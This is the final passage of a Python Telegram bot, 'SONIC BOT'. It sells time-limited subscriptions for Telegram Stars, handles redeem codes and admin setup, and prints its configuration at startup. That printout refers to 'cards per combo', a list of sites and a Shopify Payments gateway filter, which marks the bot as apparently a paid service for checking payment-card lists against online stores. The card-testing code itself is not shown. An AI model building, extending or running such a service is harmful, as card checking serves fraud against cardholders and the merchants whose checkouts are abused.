└ ⏱️ Last Update: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"""), parse_mode='html')

@bot.on(events.NewMessage(pattern='/subscribe'))
async def subscribe_cmd(event):
    user_id = event.sender_id
    if is_user_blocked(user_id) and not is_admin(user_id):
        await send_with_retry(user_id, premium_emoji("🚫 Banned"), parse_mode='html')
        return
    kb = []
    for key, plan in STAR_PRICES.items():
        kb.append([Button.inline(f"⭐ {plan['name']} - {plan['stars']}⭐", f"sub_{key}")])
    kb.append([Button.inline("🔙 Back", b"main_menu")])
    await send_with_retry(user_id, premium_emoji("⭐ <b>Buy Subscription</b>\n\nPay with Telegram Stars.\nGet time-based access!\n\nPlans:\n• 1 Hour - 30⭐\n• 12 Hours - 50⭐\n• 1 Day - 100⭐\n• 3 Days - 250⭐\n• 1 Week - 500⭐"), buttons=kb, parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/redeem\s+'))
async def redeem_cmd(event):
    user_id = event.sender_id
    if is_user_blocked(user_id) and not is_admin(user_id):
        await send_with_retry(user_id, premium_emoji("🚫 Banned"), parse_mode='html')
        return
    if is_admin(user_id):
        await send_with_retry(user_id, premium_emoji("👑 You are admin, no need to redeem!"), parse_mode='html')
        return
    args = event.text.split(maxsplit=1)
    if len(args) < 2:
        await send_with_retry(user_id, premium_emoji("❌ Usage: /redeem CODE"), parse_mode='html')
        return
    success, msg = activate_code(user_id, args[1].strip().upper())
    await send_with_retry(user_id, premium_emoji(msg), parse_mode='html')

# ==================== التشغيل ====================
async def main():
    await bot.start(bot_token=BOT_TOKEN)
    
    for admin in ADMIN_IDS:
        users = load_users()
        if str(admin) not in users:
            users[str(admin)] = {
                'user_id': admin, 
                'username': 'admin', 
                'registered_at': datetime.now().isoformat(), 
                'subscription_expiry': time.time() + 999999999, 
                'premium': True, 
                'blocked': False
            }
            save_users(users)
    
    if not os.path.exists('sites.txt'):
        with open('sites.txt', 'w') as f:
            pass
    
    asyncio.create_task(check_for_payments())
    
    print("=" * 55)
    print("✅ SONIC BOT STARTED (Full Version)")
    print(f"👑 Admins: {ADMIN_IDS}")
    print(f"⭐ Subscription plans:")
    print(f"   - 1 Hour: 30 stars")
    print(f"   - 12 Hours: 50 stars")
    print(f"   - 1 Day: 100 stars")
    print(f"   - 3 Days: 250 stars")
    print(f"   - 1 Week: 500 stars")
    print(f"📊 Max cards per combo: {MAX_CARDS_PER_COMBO}")
    print(f"🌐 Sites file: sites.txt ({len(load_sites())} sites)")
    print(f"🔌 Gateway filter: Shopify Payments only")
    print(f"💰 Price filter: 1$-10$, 5$-20$, 10$-30$, or No filter")
    print(f"⚙️ Workers: {MAX_WORKERS}")
    print("=" * 55)
    
    await bot.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
